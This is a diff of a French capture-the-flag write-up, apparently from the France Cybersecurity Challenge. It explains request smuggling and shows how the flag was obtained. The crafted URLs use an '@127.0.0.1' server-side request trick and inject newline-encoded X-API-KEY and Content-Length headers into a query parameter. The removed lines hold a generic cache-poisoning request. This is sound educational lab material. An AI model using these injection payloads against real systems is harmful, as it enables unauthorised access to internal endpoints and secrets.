@@ -50,26 +50,34 @@ On doit trouver un moyen d'utiliser des headers dans l'URL.<br/>
 A ce moment j'ai immédiatement su qu'il s'agissait d'une faille de type PHP Request Smuggling.<br/>
 Brêve explication de cette faille.<br/>
 Il faut savoir que dans ce genre de situations, il y a 3 acteurs.<br/><br/>
-• L'attaquant<br/>
-• Le proxy/firewall<br/>
-• Le serveur web<br/><br/>
+**•** L'attaquant<br/>
+**•** Le proxy/firewall<br/>
+**•** Le serveur web<br/><br/>
 Cette faille à beaucoup de variantes, mais principalement elle surgit de cette manière.<br/><br/>
-• L'attaquant se connecte au proxy, il envoie ABC<br/>
-• Le proxy l'interprète comme AB, C, et le rédirige vers le serveur<br/>
-• Le serveur web l'interprète comme A, BC, et répond avec r(A), r(BC)<br/>
-• Proxy caches r(A) pour AB, r(BC) pour C<br/><br/>
-### Interprétation globale
+**•** L'attaquant se connecte au proxy, il envoie ABC<br/>
+**•** Le proxy l'interprète comme AB, C, et le rédirige vers le serveur<br/>
+**•** Le serveur web l'interprète comme A, BC, et répond avec r(A), r(BC)<br/>
+**•** Proxy caches r(A) pour AB, r(BC) pour C<br/><br/>
+La première chose que je fais c'est ajouter ```HTTP/1.1``` à l'URL.<br/>
+J'obtiens une erreur de parsing plutôt intéressante.<br/>
+```
+Error response
+Error code: 400
 
+Message: Bad request syntax ('GET /api/secret HTTP/1.1 HTTP/1.1').
+
+Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.
 ```
-GET /api/secret HTTP/1.1
-...
-Content-Length: 0
+On constate que le ```HTTP/1.1``` a bien été ajouté dans le corps de la requête.<br/>
+Ma première idée consistait à retaper le corps de la requête directement dans l'URL en faisant attention aux sauts de ligne.<br/>
+Je tente de push le header X-API-KEY.<br/>
+```http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:1337/api/secret+HTTP/1.1%0aX-API-KEY:b99cc420eb25205168e83190bae48a12```<br/>
+Aucun résultat, je suppose qu'il y a un header ```Content-Length``` initialisé à 0, ce qui bloque la requête.<br/>
+Je calcule le length de la key.<br/>
+```py
+>>> print(len("b99cc420eb25205168e83190bae48a12"))
+32
 ```
-Web Server (first CL)
-1. /api/secret (0 bytes)
-2. /poison.html (+headers)
-```
-GET /poison.html HTTP/1.1
-Host: www.example.com
-Something: GET /target.html HTTP/1.1
-```
+J'ajoute le header avec la taille 32.<br/>
+```http://challenges2.france-cybersecurity-challenge.fr:5002/api/image?fn=@127.0.0.1:1337/api/secret+HTTP/1.1%0aX-API-KEY:b99cc420eb25205168e83190bae48a12%0aContent-length:32```<br/>
+Et là je vois le flag.<br/>
